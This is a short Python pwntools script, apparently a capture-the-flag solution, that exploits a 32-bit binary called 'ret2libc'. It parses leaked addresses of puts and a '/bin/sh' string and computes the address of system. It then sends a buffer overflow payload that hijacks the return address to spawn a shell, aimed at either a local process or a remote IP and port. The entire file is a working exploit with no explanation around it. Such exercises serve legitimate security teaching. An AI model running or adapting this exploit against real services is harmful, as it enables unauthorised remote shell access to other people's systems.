#!/usr/bin/env python
from pwn import *
from LibcSearcher import *
local = 1
elf = ELF('./ret2libc')
if local:
    p = process('./ret2libc')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    p = remote('140.113.209.24', 11002)
    libc = ELF('./libc.so.6')
system_offest = libc.symbols['system']
puts_offest = libc.symbols['puts']
p.recvuntil('is ')
sh_addr = int(p.recvuntil('\n', drop=True), 16)
print 'sh_addr =', hex(sh_addr)
p.recvuntil('is ')
puts_addr = int(p.recvuntil('\n', drop=True), 16)
print 'puts_addr =', hex(puts_addr)
system_addr = puts_addr - puts_offest + system_offest
print 'system_addr =', hex(system_addr)
offset = 32
payload = (
	'A' * offset + 
	p32(system_addr) + 
	p32(0x12345678) + 
	p32(sh_addr)
)
gdb.attach(p)
p.sendline(payload)
p.interactive()
